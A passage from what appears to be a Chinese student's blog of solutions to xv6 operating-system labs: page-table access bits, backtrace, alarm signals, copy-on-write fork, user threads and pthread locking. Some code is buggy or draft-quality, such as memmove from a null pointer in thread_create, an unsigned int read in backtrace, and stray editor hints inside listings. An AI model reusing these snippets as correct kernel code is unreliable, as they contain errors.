pagetable)</span></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;page table %p\n&quot;</span>,pagetable);</span><br><span class="line">    <span class="keyword">return</span> traceleaf(pagetable,<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后在exec中插入一个判断pid为1则执行vmprint即可。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">……</span><br><span class="line">    <span class="keyword">if</span>(p-&gt;pid==<span class="number">1</span>)</span><br><span class="line">      vmprint(p-&gt;pagetable);</span><br><span class="line">……</span><br></pre></td></tr></table></figure>

<h2 id="Detect-which-pages-have-been-accessed"><a href="#Detect-which-pages-have-been-accessed" class="headerlink" title="Detect which pages have been accessed"></a>Detect which pages have been accessed</h2><p>检验页是否被访问过。</p>
<p>根据实验提示，首先去去看pgaccess_test的函数，看看pgaccess是如何被使用的。pgaccess的参数有三个，类型分别是地址、int、地址，我猜测分别是检测的首地址(va)，被映射页数目，被使用过的页的记录(掩码的形式)。</p>
<p>然后将sys_pgaccess在kernel/sysproc.c中实现(已被声明)。然后参数还是通过argX去获取，根据上面提到的参数类型，分别使用addr, int, addr。程序运行完后将获得一个bitmask，是保存在内核内存中，需要使用copyout来将其复制到用户内存中。</p>
<p>至于页是否被使用，提示中需要我们定义一个叫PTE_A的flag在kernel/riscv.h中，让我们查看手册来查看该flag的作用:</p>
<blockquote>
<p>Each leaf PTE contains an accessed (A) and dirty (D) bit. The A bit indicates the virtual page has been read, written, or fetched from since the last time the A bit was cleared. The D bit indicates the virtual page has been written since the last time the D bit was cleared.</p>
<ul>
<li>When a virtual page is accessed and the A bit is clear, or is written and the D bit is clear, a page-fault exception is raised.</li>
<li>When a virtual page is accessed and the A bit is clear, or is written and the D bit is clear, the implementation sets the corresponding bit(s) in the PTE. The PTE update must be atomic with respect to other accesses to the PTE, and must atomically check that the PTE is valid and grants sufficient permissions. The PTE update must be exact (i.e., not speculative), and observed in program order by the local hart. Furthermore, the PTE update must appear in the global memory order no later than the explicit memory access, or any subsequent explicit memory access to that virtual page by the local hart. The ordering on loads and stores provided by FENCE instructions and the acquire/release bits on atomic instructions also orders the PTE updates associated with those loads and stores as observed by remote harts.</li>
</ul>
</blockquote>
<p>并且可以从Figure 4.15得知，PTE_A的值是6。该位是由硬件写入的，当被访问过则会置为1。</p>
<p>所以我们需要在sys_pgaccess中对每个页进行访问，检测该页的PTE_A，因此需要获取该页的pte。而根据提示，pte是通过walk获取的。最后在将该flag置零。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//riscv.h</span></span><br><span class="line">……</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PTE_A (1L &lt;&lt; 6)</span></span><br><span class="line">……</span><br><span class="line"><span class="comment">//sysproc.c</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> LAB_PGTBL</span></span><br><span class="line"><span class="function"><span class="keyword">int</span></span></span><br><span class="line"><span class="function"><span class="title">sys_pgaccess</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="comment">// lab pgtbl: your code here.</span></span><br><span class="line">  uint64 addr;</span><br><span class="line">  <span class="keyword">int</span> num;</span><br><span class="line">  uint64 dstmask;</span><br><span class="line"></span><br><span class="line">  argaddr(<span class="number">0</span>,&amp;addr);</span><br><span class="line">  argint(<span class="number">1</span>,&amp;num);                                                     </span><br><span class="line">  argaddr(<span class="number">2</span>,&amp;dstmask);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> mask=<span class="number">0</span>;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">proc</span>* <span class="title">p</span>=</span>myproc();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;num;i++)&#123;</span><br><span class="line">    uint64 pgva=addr+i*PGSIZE;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">pte_t</span>* pte=walk(p-&gt;pagetable,pgva,<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(pte&amp;&amp;(*pte&amp;PTE_A))&#123;</span><br><span class="line">      mask|=<span class="number">1</span>&lt;&lt;i;</span><br><span class="line">      *pte&amp;=~PTE_A;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(copyout(p-&gt;pagetable,dstmask,(<span class="keyword">char</span>*)&amp;mask,<span class="keyword">sizeof</span>(mask)))</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="Lab4-traps"><a href="#Lab4-traps" class="headerlink" title="Lab4: traps"></a>Lab4: traps</h1><h2 id="Backtrace"><a href="#Backtrace" class="headerlink" title="Backtrace"></a>Backtrace</h2><p>根据实验描述，我们需要完成函数backtrace，来遍历栈上各栈帧的返回地址。并在sys_sleep中加入对该函数的调用。</p>
<p>然后根据提示，首先在def.h中加入backtrace的声明，接着在riscv.h中添加代码(函数r_fp)，该代码是用来读取s0的值的，因为gcc会将正在执行的栈帧指针保存到s0中。</p>
<p>通过PGROUNDDOWN(fp)与PGROUNDUP(fp)来计算栈页面是否遍历尽。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">backtrace</span><span class="params">()</span></span>&#123;</span><br><span class="line">  uint64 fp=r_fp();</span><br><span class="line">  uint64 ra=<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span>(;PGROUNDUP(fp)-PGROUNDDOWN(fp)==PGSIZE;)&#123;</span><br><span class="line">    ra=*(<span class="keyword">unsigned</span> <span class="keyword">int</span>*)(fp<span class="number">-8</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%p\n&quot;</span>,ra);</span><br><span class="line">    fp=*(uint64*)(fp<span class="number">-0x10</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Alarm"><a href="#Alarm" class="headerlink" title="Alarm"></a>Alarm</h2><p>根据实验提示，我们需要添加新的系统调用<code>sigalarm</code>和<code>sigreturn</code>。</p>
<p>然后再查看进行测试的代码user/alarmtest.c，发现这个sigalarm是每隔一段时间就想当前进程发送alarm信号，和定期发送信号的时间间隔，发送信号的间隔和处理函数就是sigalarm的两个参数</p>
<p>根据提示实现sigalarm：</p>
<ul>
<li>将报警间隔和指向处理程序函数的指针存储在struct proc的新字段中，该函数需要更新proc中的字段</li>
</ul>
<p>再根据提示修改user/trap.c:</p>
<ul>
<li>proc还需要一个字段，用来跟踪自上一次调用(或直到下一次调用)这个时间段之间，处理程序经历了多少次tick的计数</li>
<li>当产生了一次tick，就会强制中断一次，是在usertrap中实现的的时钟中断</li>
</ul>
<p>test0的主要任务是实现handler的调用，应该是通过时钟中断并根据当前的tick数来执行handler，再根据提示，应该是在usertrap的时钟中断部分进行修改</p>
<p>由于陷入后处于内核态，而handler是处于用户态的函数，然后根据提示，我们还需要将trapframe中的epc设置为handler</p>
<p>继续test1/test2/test3，这个需要我们完成sigreturn，也就是恢复中断的代码(我们之前仅仅是覆盖了epc)，就将返回前的trapframe保存一个副本在proc结构体中即可</p>
<p>继续实现sigalarm:</p>
<ul>
<li>proc结构体中加入一个flag，用来记录当前是否在执行alarm - 根据提示，在proc中加入一个trapframe的副本alarmframe，并在usertrap中复制trapframe的内容到其中</li>
</ul>
<p>实现sigreturn:</p>
<ul>
<li>在将之前存入的数据复制到trapframe</li>
<li>返回值填a0，不然过不了test3</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">uint64 <span class="title">sys_sigalarm</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> interval;</span><br><span class="line">  <span class="keyword">void</span> (*handler)();</span><br><span class="line"></span><br><span class="line">  argint(<span class="number">0</span>,&amp;interval);</span><br><span class="line">  argaddr(<span class="number">1</span>,(uint64*)&amp;handler);</span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">proc</span>* <span class="title">p</span>=</span>myproc();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(interval&lt;<span class="number">0</span>||handler&lt;<span class="number">0</span>)</span><br><span class="line">    panic(<span class="string">&quot;sigalarm&quot;</span>);</span><br><span class="line"></span><br><span class="line">  p-&gt;alarm_interval=interval;</span><br><span class="line">  p-&gt;alarm_handler=handler;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">uint64 <span class="title">sys_sigreturn</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">proc</span>* <span class="title">p</span>=</span>myproc();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(p-&gt;is_alarm)</span><br><span class="line">    memmove(p-&gt;trapframe, p-&gt;alarmframe, <span class="keyword">sizeof</span>(struct trapframe));</span><br><span class="line"></span><br><span class="line">  p-&gt;is_alarm=<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> p-&gt;trapframe-&gt;a0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="Lab5-device-drivers"><a href="#Lab5-device-drivers" class="headerlink" title="Lab5: device drivers"></a>Lab5: device drivers</h1><p>驱动程序是操作系统中管理特点设备的代码，用来配置硬件设备并告诉设备如何执行操作，并处理由此产生的中断，同时与正在等待设备的进程进行交互。由于需要理解硬件接口，因此需要查看文档。</p>
<p>驱动程序的代码通常分两部分执行，一部分是在系统调用中执行，还有一部分在中断时执行</p>
<h2 id="Implement-copy-on-write-fork"><a href="#Implement-copy-on-write-fork" class="headerlink" title="Implement copy-on-write fork"></a>Implement copy-on-write fork</h2><p>写时复制，因为fork会复制父进程的内存空间，这样效率太慢，因此改为浅拷贝，并在需要写入内存时才会进行深拷贝</p>
<p>根据实验给出的solution，需要实现的地方有，fork后获得父子进程的page对应的PTE全部设置为only-read，当进程尝试写入其中一个page时发生页中断，然后才进行一次深拷贝</p>
<p>根据实验提示，首先要修改uvmcopy，将父进程的physical page映射到子进程中，而不是分配新的page，最后清除两个进程PTE的可写权限。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span></span></span><br><span class="line"><span class="function"><span class="title">uvmcopy</span><span class="params">(<span class="keyword">pagetable_t</span> old, <span class="keyword">pagetable_t</span> <span class="keyword">new</span>, uint64 sz)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">pte_t</span> *pte;</span><br><span class="line">  uint64 pa, i;</span><br><span class="line">  uint flags;</span><br><span class="line">  <span class="comment">//char *mem;</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; sz; i += PGSIZE)&#123;</span><br><span class="line">    <span class="keyword">if</span>((pte = walk(old, i, <span class="number">0</span>)) == <span class="number">0</span>)</span><br><span class="line">      panic(<span class="string">&quot;uvmcopy: pte should exist&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>((*pte &amp; PTE_V) == <span class="number">0</span>)</span><br><span class="line">      panic(<span class="string">&quot;uvmcopy: page not present&quot;</span>);</span><br><span class="line">    pa = PTE2PA(*pte);</span><br><span class="line">    flags = PTE_FLAGS(*pte);</span><br><span class="line">    <span class="comment">//if((mem = kalloc()) == 0)</span></span><br><span class="line">    <span class="comment">//  goto err;</span></span><br><span class="line">    <span class="comment">//memmove(mem, (char*)pa, PGSIZE);</span></span><br><span class="line">    <span class="comment">//if(mappages(new, i, PGSIZE, (uint64)mem, flags) != 0)&#123;</span></span><br><span class="line">    <span class="comment">//  kfree(mem);</span></span><br><span class="line">    <span class="comment">//  goto err;</span></span><br><span class="line">    <span class="comment">//&#125;</span></span><br><span class="line">    flags=flags&amp;~PTE_W;</span><br><span class="line">    *pte=PA2PTE(pa)|flags;</span><br><span class="line">    <span class="keyword">if</span>(mappages(<span class="keyword">new</span>,i,PGSIZE,pa,flags)!=<span class="number">0</span>)&#123;</span><br><span class="line">      <span class="keyword">goto</span> err;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"> err:</span><br><span class="line">  uvmunmap(<span class="keyword">new</span>, <span class="number">0</span>, i / PGSIZE, <span class="number">1</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>接着修改usertrap以识别页面错误</p>
<ul>
<li><p>根据下图可以知道相应的scause是13和15，分别是load和store该page时会触发的中断<br><img src="https://906337931-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MHZoT2b_bcLghjAOPsJ%2F-MMD_TK8Ar4GqWE6xfWV%2F-MMNmVfRDZSAOKze10lZ%2Fimage.png?alt=media&token=4bbfdfa6-1491-4ab8-8248-03bd0e36a8e9" alt="scause"></p>
</li>
<li><p>接着是复制对应page，那么首先就要找到产生页错误的页，即无法翻译的地址，这个地址是保存在stval寄存器中的。使用上个实验中差不多的代码r_stval返回这个寄存器中的地址。然后找到该地址对应的物理地址，使用的是walkaddr，接着还要修改两个page对应PTE。</p>
  <figure class="highlight c"><table><tr><td class="code"><pre><span class="line">……</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(cause==<span class="number">13</span>||cause==<span class="number">15</span>)&#123;</span><br><span class="line">  <span class="keyword">pagetable_t</span> npage=kalloc();</span><br><span class="line"></span><br><span class="line">  uint64 va=r_stval();</span><br><span class="line">  uint64 pa=walkaddr(p-&gt;pagetable,va);</span><br><span class="line">  memmove(npage,pa,PGSIZE);</span><br><span class="line">&#125;</span><br><span class="line">……</span><br></pre></td></tr></table></figure></li>
<li><p>接着是要识别是否是cow，直接在PTE中加入一个flag，用来标记fork时的cow，使用保留的8为该flag。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// kernel/trap.c(usertrap)</span></span><br><span class="line"> ……</span><br><span class="line">   <span class="keyword">else</span> <span class="keyword">if</span>(cause == <span class="number">15</span>)&#123;</span><br><span class="line">   uint64 va = r_stval();</span><br><span class="line">   va=PGROUNDDOWN(va);</span><br><span class="line"> </span><br><span class="line">   uint64 pa=walkaddr(p-&gt;pagetable,va);</span><br><span class="line">   <span class="keyword">pte_t</span>* pte=walk(p-&gt;pagetable,va,<span class="number">0</span>);</span><br><span class="line">   uint flags=PTE_FLAGS(*pte);</span><br><span class="line"> </span><br><span class="line">   <span class="keyword">if</span>((flags&amp;PTE_C)==<span class="number">0</span>)</span><br><span class="line">     setkilled(p);</span><br><span class="line"> </span><br><span class="line">   flags|=PTE_W;</span><br><span class="line">   flags&amp;=~PTE_C;</span><br><span class="line"> </span><br><span class="line">   <span class="comment">//if(refcount[(uint64)pa/PGSIZE]==1)&#123;</span></span><br><span class="line">   <span class="comment">//  *pte|=flags;</span></span><br><span class="line"><span class="number">1</span>  <span class="comment">//&#125;else&#123;</span></span><br><span class="line">     <span class="keyword">char</span>* mem;</span><br><span class="line"> </span><br><span class="line">     <span class="keyword">if</span>((mem=kalloc())==<span class="number">0</span>)</span><br><span class="line">       setkilled(p);</span><br><span class="line"> </span><br><span class="line">     *pte&amp;=~PTE_V;</span><br><span class="line"> </span><br><span class="line">     memmove(mem,(<span class="keyword">void</span>*)pa,PGSIZE);</span><br><span class="line">     <span class="keyword">if</span>((mappages(p-&gt;pagetable,va,PGSIZE,(uint64)mem,flags))!=    <span class="number">0</span>)&#123;</span><br><span class="line">       kfree(mem);</span><br><span class="line">       uvmunmap(p-&gt;pagetable,va,PGSIZE,<span class="number">1</span>);</span><br><span class="line">       *pte|=PTE_V;</span><br><span class="line">     &#125;</span><br><span class="line">     kfree((<span class="keyword">char</span>*)PGROUNDDOWN(pa));</span><br><span class="line">   <span class="comment">//&#125;</span></span><br><span class="line"> &#125;</span><br><span class="line">……</span><br></pre></td></tr></table></figure></li>
<li><p>接着pte的引用计数-1，这个引用计数需要我们自己设置，根据实验提示，这个引用计数是一个整形数组，并且这是全局变量，我定义在了kernel/kalloc.c中。数组的大小以及如何索引也给出了方案，<code>用页的物理地址除以4096对数组进行索引</code>，而数组的长度<code>等同于kalloc.c中kinit()在空闲列表中放置的所有页面的最高物理地址的元素数</code>也就是<code>PHYSTOP/4096</code>。然后在kalloc、kfree还有fork中添加对该计数的操作。需要注意的是，我们需要将该引用计数数组的初始值设置为1，否则在kinit中将不会生成freelist。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> refcount[PHYSTOP/PGSIZE]=&#123;<span class="number">1</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span></span></span><br><span class="line"><span class="function"><span class="title">kfree</span><span class="params">(<span class="keyword">void</span> *pa)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">run</span> *<span class="title">r</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(((uint64)pa % PGSIZE) != <span class="number">0</span> || (<span class="keyword">char</span>*)pa &lt; end || (uint64      )pa &gt;= PHYSTOP)</span><br><span class="line">    panic(<span class="string">&quot;kfree&quot;</span>);</span><br><span class="line"></span><br><span class="line">  refcount[(uint64)pa / PGSIZE]--;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(refcount[(uint64)pa / PGSIZE] == <span class="number">0</span>)&#123;</span><br><span class="line">    <span class="comment">// Fill with junk to catch dangling refs.</span></span><br><span class="line">    <span class="built_in">memset</span>(pa, <span class="number">1</span>, PGSIZE);</span><br><span class="line"></span><br><span class="line">    r = (struct run*)pa;</span><br><span class="line"></span><br><span class="line">    acquire(&amp;kmem.lock);</span><br><span class="line">    r-&gt;next = kmem.freelist;</span><br><span class="line">    kmem.freelist = r;</span><br><span class="line">    release(&amp;kmem.lock);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> *</span></span><br><span class="line"><span class="function"><span class="title">kalloc</span><span class="params">(<span class="keyword">void</span>)</span>                 </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">run</span> *<span class="title">r</span>;</span></span><br><span class="line"></span><br><span class="line">  acquire(&amp;kmem.lock);</span><br><span class="line">  r = kmem.freelist;</span><br><span class="line">  <span class="keyword">if</span>(r)</span><br><span class="line">    kmem.freelist = r-&gt;next;</span><br><span class="line">  release(&amp;kmem.lock);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(r)</span><br><span class="line">    <span class="built_in">memset</span>((<span class="keyword">char</span>*)r, <span class="number">5</span>, PGSIZE); <span class="comment">// fill with junk</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(r)</span><br><span class="line">    refcount[(uint64)r/PGSIZE]=<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> (<span class="keyword">void</span>*)r; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li><p>最后一步，修改copyout。copyout会将内核空间中的内容复制到用户空间，这期间也涉及到了一个存储的过程。当我们的dst地址为PTE_C页时就需要我们申请一个新的page供复制内容。因此当我们执行与cow相同的步骤后就重新给pa0赋值这个新申请的内存即可，同样将va0重新映射pa0。所以我们把之前在usertrap中写的代码封装为一个函数，在这里使用，返回值是新申请的地址。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span>* <span class="title">cow</span><span class="params">(<span class="keyword">pagetable_t</span> pagetable,uint64 va)</span></span>&#123;</span><br><span class="line">  uint64 pa=walkaddr(pagetable,va);</span><br><span class="line">  <span class="keyword">pte_t</span>* pte=walk(pagetable,va,<span class="number">0</span>);</span><br><span class="line">  uint flags=PTE_FLAGS(*pte);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>((flags&amp;PTE_C)==<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  </span><br><span class="line">  flags|=PTE_W;</span><br><span class="line">  flags&amp;=~PTE_C;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">char</span>* mem;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>((mem=kalloc())==<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  </span><br><span class="line">  *pte&amp;=~PTE_V;</span><br><span class="line"></span><br><span class="line">  memmove(mem,(<span class="keyword">void</span>*)pa,PGSIZE);</span><br><span class="line">  <span class="keyword">if</span>((mappages(pagetable,va,PGSIZE,(uint64)mem,flags))!=<span class="number">0</span>)&#123;</span><br><span class="line">    kfree(mem);</span><br><span class="line">    uvmunmap(pagetable,va,PGSIZE,<span class="number">1</span>);</span><br><span class="line">    *pte|=PTE_V;</span><br><span class="line">  &#125; </span><br><span class="line">  kfree((<span class="keyword">char</span>*)PGROUNDDOWN(pa));</span><br><span class="line">  <span class="keyword">return</span> mem;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// kernel/vm.c(copyout)</span></span><br><span class="line"><span class="function"><span class="keyword">int</span></span></span><br><span class="line"><span class="function"><span class="title">copyout</span><span class="params">(<span class="keyword">pagetable_t</span> pagetable, uint64 dstva, <span class="keyword">char</span> *src, uint64     len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  uint64 n, va0, pa0;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span>(len &gt; <span class="number">0</span>)&#123;</span><br><span class="line">    va0 = PGROUNDDOWN(dstva);</span><br><span class="line">    pa0 = walkaddr(pagetable, va0);</span><br><span class="line">    <span class="keyword">pte_t</span>* pte=walk(pagetable,va0,<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">int</span> flags=PTE_FLAGS(*pte);</span><br><span class="line"></span><br><span class="line">    flags|=PTE_W;</span><br><span class="line">    flags&amp;=~PTE_C;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(pa0 == <span class="number">0</span>)</span><br><span class="line">      <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">if</span>(pte == <span class="number">0</span>)</span><br><span class="line">      <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">                                                               </span><br><span class="line">    <span class="keyword">if</span>((*pte&amp;PTE_C))</span><br><span class="line">      pa0=(uint64)cow(pagetable,va0);</span><br><span class="line"></span><br><span class="line">    n = PGSIZE - (dstva - va0);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(n &gt; len)</span><br><span class="line">      n = len;</span><br><span class="line">    memmove((<span class="keyword">void</span> *)(pa0 + (dstva - va0)), src, n);</span><br><span class="line"></span><br><span class="line">    len -= n;</span><br><span class="line">    src += n;</span><br><span class="line">    dstva = va0 + PGSIZE;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
<h1 id="Lab6-Multithreading"><a href="#Lab6-Multithreading" class="headerlink" title="Lab6: Multithreading"></a>Lab6: Multithreading</h1><h2 id="Uthread-switching-between-threads"><a href="#Uthread-switching-between-threads" class="headerlink" title="Uthread: switching between threads"></a>Uthread: switching between threads</h2><p>完成uthread测试，需要完成创建线程，保存和恢复寄存器内容。</p>
<p>先看看文件:</p>
<ul>
<li>user/uthread.c<ul>
<li>thread_init(): 初始化多线程，其实也就是设置全局变量current_thread。</li>
<li>thread_create(void (*func)()): 创建线程，我们的代码需要写在这里。</li>
<li>thread_schedule(): 切换线程，类似内核中的scheduler，遍历线程数组，找到状态为RUNNABLE的线程(若没有则使用数组中的第一个元素)且该线程不能是当前执行的线程，接着重新设置线程的状态为RUNNING，并修改current_thread为该线程。但很明显，这样没有什么实际作用，因此我们还需要在uthread_switch.S中添加代码来完善thread_switch()，并在这里使用。</li>
<li>thread_yeild(): 和内核中切换上下文的yeild差不多，重新设置线程的状态为RUNNALBLE并调用thread_schedule</li>
</ul>
</li>
<li>user/uthread_switch.S: 只有thread_switch函数，我们需要用汇编代码完成，感觉也应该类似内核中的swtch</li>
</ul>
<p>首先是实现线程的创建，线程是进程的一个执行单元，一个进程中可以不止一个线程。而代码在执行过程中需要自动动态分配的是栈空间，也就是说创建线程需要给每个线程创建一个不同栈空间。结果在uthread.c中的thread结构体中已经给我们分配好了栈，那还需要添加啥啊。</p>
<p>继续，thread_schedule中已经将修改状态写了，剩下只需要将thread_switch填充了就行了，可以仿造swtch来写(直接复制)，也就是保存和恢复寄存器。那我们还需要一个结构用来保存寄存器的内容(context)，那就在thread_create中添加一段代码来初始化这个context，然后在thread_switch中能够切换。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span></span></span><br><span class="line"><span class="function"><span class="title">thread_create</span><span class="params">(<span class="keyword">void</span> (*func)())</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">thread</span> *<span class="title">t</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (t = all_thread; t &lt; all_thread + MAX_THREAD; t++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (t-&gt;state == FREE) <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  t-&gt;state = RUNNABLE;</span><br><span class="line">  <span class="comment">// YOUR CODE HERE</span></span><br><span class="line">  memmove(&amp;t-&gt;context,<span class="number">0</span>,<span class="keyword">sizeof</span>(struct thread_context));</span><br><span class="line">  t-&gt;context.sp=(uint64)t-&gt;<span class="built_in">stack</span>+STACK_SIZE;</span><br><span class="line">  t-&gt;context.ra=(uint64)func;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>需要注意的是，由于栈是从高地址向低地址生长的，因此这里的栈顶应该为栈空间的最后一个成员。</p>
<h2 id="Using-threads"><a href="#Using-threads" class="headerlink" title="Using threads"></a>Using threads</h2><p>实验需要在一个真实的Linux中完成。</p>
<p>首先是一个哈希表的实现，notxv6/ph.c:</p>
<ul>
<li>程序需要读取一个整形参数(大于1)，作为线程数</li>
<li>哈希表的长度为5，即有5个bucket，根据不同的键将节点放入对应的bucket中。节点是entry结构体，其中包括一对键值对，还有下一个entry的地址。</li>
<li>有两个基准程序put和get<ul>
<li>put(): 将一对键值对添加到哈希表中</li>
<li>get(): 从哈希表中获取一对键值对</li>
</ul>
</li>
</ul>
<p>在编译后执行ph程序，通过不同数目的线程可以得到不同的结果，多线程会导致保存数据时不同步而出现<code>key missing</code>，单线程则不会。我们需要修改程序来避免出现丢失键的结果。</p>
<p>产生key missing的原因，是get_thread中调用get时没有获取到键。很显然是因为由于保存表中数据时产生的丢失。</p>
<p>表就是临界区，或者说是表中节点的地址，但如果直接在put前后加锁，由于其中有一个遍历的过程，所以效率太低了。我们再看的细致一点，该过程中的不变量为: 对应bucket指向当前链表头部，当key不存在于对应bucket链表中时，需要将新节点插入到链表的头部，即<strong>新节点的next指向原头部节点</strong>，然后<strong>哈希表中记录的原头部节点地址会被替换</strong>。这个不变量会在其他CPU执行insert后被违反，导致插入过程中数据被覆盖。</p>
<p>找到不变量后，insert也可以写的更凝练一点(去掉最后一个参数)，并在使用不变量前后加上锁(或者至少是在insert前后)。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span></span></span><br><span class="line"><span class="function"><span class="title">insert</span><span class="params">(<span class="keyword">int</span> key, <span class="keyword">int</span> value, struct entry **p)</span><span class="comment">//, struct entry *n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">entry</span> *<span class="title">e</span> =</span> <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(struct entry)); ‣size: <span class="keyword">sizeof</span>(struct entry)</span><br><span class="line">  e-&gt;key = key;</span><br><span class="line">  e-&gt;value = value;</span><br><span class="line">  pthread_mutex_lock(&amp;lock); ‣mutex: &amp;lock</span><br><span class="line">  e-&gt;next = *p;<span class="comment">//n;</span></span><br><span class="line">  *p = e;</span><br><span class="line">  pthread_mutex_unlock(&amp;lock); ‣mutex: &amp;lock</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><em>ps: 如果插入的是链表的尾部尾部就太麻烦了，还需要获取当前链表的长度，如果获取长度放在insert外，这个长度也是不变量(到达next为0节点的计数);放在insert内又是一个循环，效率降低</em></p>
<h2 id="Barrier"><a href="#Barrier" class="headerlink" title="Barrier"></a>Barrier</h2><p>同步屏障，一种同步方法。对于一群进程或线程，程序中的一个同步屏障意味着任何线程/进程执行到此后必须等待，直到所有线程/进程都到达此点才可继续执行下文。</p>
<p>也是需要在一个真实的Linux中完成。</p>
<p>我们要实现一个barrier，在notxv6/barrier.c中有一个残缺的:</p>
<ul>
<li>接受一个参数作为线程数</li>
<li>barrier结构体中，包含一个互斥锁，一个条件变量，线程数目，当前轮数</li>
<li>barrier有几个相关函数:<ul>
